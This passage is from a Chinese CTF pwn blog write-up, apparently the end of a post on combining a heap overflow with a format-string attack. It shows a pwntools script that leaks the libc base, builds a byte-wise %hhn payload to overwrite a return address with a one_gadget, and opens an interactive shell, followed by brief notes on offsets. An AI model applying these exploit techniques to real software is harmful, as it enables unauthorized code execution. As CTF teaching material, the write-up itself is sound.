class="comment">#注意转换整数</span></span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">&#x27;_IO_stdfile_1_lock&#x27;</span>]</span><br><span class="line"><span class="comment">#system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x3f3d6</span> <span class="comment"># 0x3f42a 0xd5bf7</span></span><br><span class="line">log.success(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;one_gadget address: <span class="subst">&#123;<span class="built_in">hex</span>(one_gadget)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#log.success(f&quot;System address: &#123;hex(system_addr)&#125;&quot;)</span></span><br><span class="line"><span class="comment">#log.success(f&quot;/bin/sh address: &#123;hex(binsh_addr)&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;STACK:&quot;</span>)</span><br><span class="line">stack = io.recv(<span class="number">14</span>)</span><br><span class="line">log.success(<span class="string">f&quot;Stack address: <span class="subst">&#123;(stack)&#125;</span>&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack, <span class="number">16</span>)</span><br><span class="line">return_addr_addr = stack_addr - <span class="number">440</span> <span class="comment"># 返回地址所在的地址</span></span><br><span class="line">log.success(<span class="string">f&quot;Return addr address: <span class="subst">&#123;<span class="built_in">hex</span>(return_addr_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">order2(<span class="string">b&quot;2222&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">order1(<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + <span class="string">b&quot;\x51\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = one_gadget</span><br><span class="line">bytes1 = (target &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xff</span>   <span class="comment"># 0xf8</span></span><br><span class="line">bytes2 = (target &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>   <span class="comment"># 0x76</span></span><br><span class="line">bytes3 = (target &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>  <span class="comment"># 0x23</span></span><br><span class="line">bytes4 = (target &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>  <span class="comment"># 0x81</span></span><br><span class="line">bytes5 = (target &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xff</span>  <span class="comment"># 0xfc</span></span><br><span class="line">bytes6 = (target &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>  <span class="comment"># 0x7f</span></span><br><span class="line"><span class="comment">#bytes7 = (target &gt;&gt; 48) &amp; 0xff  # 0x00</span></span><br><span class="line"><span class="comment">#bytes8 = (target &gt;&gt; 56) &amp; 0xff  # 0x00</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;bytes1: <span class="subst">&#123;<span class="built_in">hex</span>(bytes1)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;bytes1: <span class="subst">&#123;<span class="built_in">hex</span>(bytes2)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;bytes1: <span class="subst">&#123;<span class="built_in">hex</span>(bytes3)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;bytes1: <span class="subst">&#123;<span class="built_in">hex</span>(bytes4)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;bytes1: <span class="subst">&#123;<span class="built_in">hex</span>(bytes5)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;bytes1: <span class="subst">&#123;<span class="built_in">hex</span>(bytes6)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">need1 = bytes1                     <span class="comment"># 因为从0开始，need1 = bytes1</span></span><br><span class="line">need2 = (bytes2 - bytes1) % <span class="number">256</span>    <span class="comment"># bytes2 需要比 bytes1 多 (bytes2-bytes1)</span></span><br><span class="line">need3 = (bytes3 - bytes2) % <span class="number">256</span>    <span class="comment"># bytes3 需要比 bytes2 多 (bytes3-bytes2)</span></span><br><span class="line">need4 = (bytes4 - bytes3) % <span class="number">256</span></span><br><span class="line">need5 = (bytes5 - bytes4) % <span class="number">256</span></span><br><span class="line">need6 = (bytes6 - bytes5) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">fmt_payload =  <span class="string">&quot;%&#123;&#125;c%13$hhn&quot;</span>.<span class="built_in">format</span>(need1) </span><br><span class="line">fmt_payload += <span class="string">&quot;%&#123;&#125;c%14$hhn&quot;</span>.<span class="built_in">format</span>(need2) </span><br><span class="line">fmt_payload += <span class="string">&quot;%&#123;&#125;c%15$hhn&quot;</span>.<span class="built_in">format</span>(need3) </span><br><span class="line">fmt_payload += <span class="string">&quot;%&#123;&#125;c%16$hhn&quot;</span>.<span class="built_in">format</span>(need4) </span><br><span class="line">fmt_payload += <span class="string">&quot;%&#123;&#125;c%17$hhn&quot;</span>.<span class="built_in">format</span>(need5)</span><br><span class="line">fmt_payload += <span class="string">&quot;%&#123;&#125;c%18$hhn&quot;</span>.<span class="built_in">format</span>(need6)</span><br><span class="line"></span><br><span class="line">fmt_payload = fmt_payload.encode()</span><br><span class="line">fmt_payload += <span class="string">b&quot;a&quot;</span>*(<span class="number">116</span> - <span class="built_in">len</span>(fmt_payload))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(fmt_payload)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">order1(fmt_payload) </span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *0x400cac</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">ROPchain =  p64(return_addr_addr)</span><br><span class="line">ROPchain += p64(return_addr_addr+<span class="number">1</span>)</span><br><span class="line">ROPchain += p64(return_addr_addr+<span class="number">2</span>)</span><br><span class="line">ROPchain += p64(return_addr_addr+<span class="number">3</span>)</span><br><span class="line">ROPchain += p64(return_addr_addr+<span class="number">4</span>)</span><br><span class="line">ROPchain += p64(return_addr_addr+<span class="number">5</span>) <span class="comment"># 6、7字节为0</span></span><br><span class="line"></span><br><span class="line">submit(ROPchain)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我们还需要调试看一下布置的ROP链的偏移，(下图是另一个进程，地址与上面不匹配)，这个偏移也是固定的，96字节。</p>
+<p>当时在这里产生了一个奇怪的想法：NX开启栈不可执行，那这里ROP链可以触发吗？之后发现我记错了，NX是栈上的数据不可以当指令，这里栈上的都是地址，有点好笑。</p>
+<p>![屏幕截图 2026-03-10 232807](C:\Users\WH\Pictures\Screenshots\屏幕截图 2026-03-10 232807.png)</p>
+<p>依然通过多个%p探测，发现目标地址在13参数位置，不再赘述。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/heap-overflow/" rel="tag"># heap-overflow</a>
+              <a href="/tags/format-string/" rel="tag"># format-string</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/28/2026-02-28-Chunk-Extend-and-Overlapping/" rel="prev" title="学习笔记：Chunk Extend and Overlapping">
+                  <i class="fa fa-angle-left"></i> 学习笔记：Chunk Extend and Overlapping
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder"></span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
